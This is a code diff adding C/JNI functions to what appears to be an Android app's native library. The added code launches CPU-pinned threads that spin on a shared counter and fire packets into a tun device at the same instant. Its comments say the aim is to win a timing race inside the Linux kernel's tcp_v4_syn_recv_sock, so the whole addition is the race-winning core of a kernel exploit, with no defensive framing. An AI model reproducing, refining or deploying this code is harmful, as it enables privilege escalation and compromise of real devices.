@@ -27,6 +27,8 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/syscall.h>
+#include <pthread.h>
+#include <stdint.h>
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <unistd.h>
@@ -396,6 +398,178 @@ Java_com_inj_Native_currentCpu(JNIEnv *env, jclass cls)
         }
     }
     return -1;
+}
+
+// ---------------------------------------------------------------------------
+// Native race writers.
+//
+// The whole point of moving these into C is latency. A Java thread that leaves
+// a spin loop still has to return through the JNI frame, go through
+// FileOutputStream, enter the syscall and only then reach tun_get_user. That
+// chain costs microseconds, while the window inside tcp_v4_syn_recv_sock -
+// between reading ireq->ireq_opt and removing the request socket from the ehash
+// - is a few hundred nanoseconds. The race can never be won from Java because
+// the spread between the writers is an order of magnitude larger than the
+// window they are supposed to fall into.
+//
+// Here each writer sits in a bare spin on a generation counter and issues
+// write() the moment it changes. Four threads on four cpus leave their loop
+// within a cache line transfer of each other.
+// ---------------------------------------------------------------------------
+
+#define RACE_MAX 8
+
+struct race_state {
+    int fd;
+    int count;
+    int stop;
+
+    // Kept on their own cache lines. Writers bump done constantly while the
+    // publisher polls it, so sharing a line with target would make every
+    // completion invalidate the line the spinners are reading.
+    volatile int target __attribute__((aligned(64)));
+    volatile int done __attribute__((aligned(64)));
+
+    unsigned char buf[RACE_MAX][256] __attribute__((aligned(64)));
+    int buflen[RACE_MAX];
+};
+
+static struct race_state g_race;
+static pthread_t g_race_threads[RACE_MAX];
+static int g_race_started;
+
+static void *race_thread(void *arg)
+{
+    int slot = (int)(intptr_t)arg;
+
+    // One cpu per writer, before the first packet is ever sent.
+    unsigned long mask = 1UL << (1 + slot);
+    syscall(__NR_sched_setaffinity, 0, sizeof(mask), &mask);
+
+    int seen = 0;
+    while (!g_race.stop) {
+        while (g_race.target == seen && !g_race.stop) {
+            __asm__ __volatile__("yield" ::: "memory");
+        }
+        if (g_race.stop) {
+            break;
+        }
+
+        seen = g_race.target;
+
+        int idx = slot;
+        int n = g_race.buflen[idx];
+        if (n > 0) {
+            // Straight to the tun. No buffering layer, no allocation, no lock:
+            // this call is the last step before tun_get_user runs the receive
+            // path on this very cpu.
+            ssize_t rc = write(g_race.fd, g_race.buf[idx], (size_t)n);
+            (void)rc;
+        }
+
+        __sync_fetch_and_add(&g_race.done, 1);
+    }
+
+    return NULL;
+}
+
+JNIEXPORT jint JNICALL
+Java_com_inj_Native_raceStart(JNIEnv *env, jclass cls, jint fd, jint count)
+{
+    (void)env;
+    (void)cls;
+
+    if (g_race_started) {
+        return 0;
+    }
+    if (count < 2) {
+        count = 2;
+    }
+    if (count > RACE_MAX) {
+        count = RACE_MAX;
+    }
+
+    memset(&g_race, 0, sizeof(g_race));
+    g_race.fd = fd;
+    g_race.count = count;
+    g_race.stop = 0;
+
+    for (int i = 0; i < count; i++) {
+        if (pthread_create(&g_race_threads[i], NULL, race_thread,
+                           (void *)(intptr_t)i) != 0) {
+            g_race.stop = 1;
+            return -1;
+        }
+    }
+
+    g_race_started = 1;
+    return count;
+}
+
+// Publish a pair of packets to all race writers and wait until every one of
+// them has issued its write.
+JNIEXPORT jint JNICALL
+Java_com_inj_Native_raceFire(JNIEnv *env, jclass cls, jbyteArray a, jbyteArray b)
+{
+    (void)cls;
+
+    if (!g_race_started) {
+        return -1;
+    }
+
+    jsize la = (*env)->GetArrayLength(env, a);
+    jsize lb = (*env)->GetArrayLength(env, b);
+    if (la > (jsize)sizeof(g_race.buf[0]) || lb > (jsize)sizeof(g_race.buf[0])) {
+        return -2;
+    }
+
+    // Fill every other slot with the same two payloads. All writers race, and
+    // getting two of them through the window is what matters - which two is up
+    // to the scheduler.
+    for (int i = 0; i < g_race.count; i++) {
+        if ((i & 1) == 0) {
+            (*env)->GetByteArrayRegion(env, a, 0, la, (jbyte *)g_race.buf[i]);
+            g_race.buflen[i] = la;
+        } else {
+            (*env)->GetByteArrayRegion(env, b, 0, lb, (jbyte *)g_race.buf[i]);
+            g_race.buflen[i] = lb;
+        }
+    }
+
+    g_race.done = 0;
+    __sync_synchronize();
+
+    // One store releases every spinner at once.
+    g_race.target++;
+
+    uint64_t deadline = 0;
+    while (g_race.done < g_race.count) {
+        if (++deadline > 400000000ULL) {
+            return -3;
+        }
+    }
+
+    return g_race.count;
+}
+
+JNIEXPORT void JNICALL
+Java_com_inj_Native_raceStop(JNIEnv *env, jclass cls)
+{
+    (void)env;
+    (void)cls;
+
+    if (!g_race_started) {
+        return;
+    }
+
+    g_race.stop = 1;
+    g_race.target++;
+
+    for (int i = 0; i < g_race.count; i++) {
+        pthread_join(g_race_threads[i], NULL);
+    }
+
+    g_race_started = 0;
 }
 
 JNIEXPORT jint JNICALL
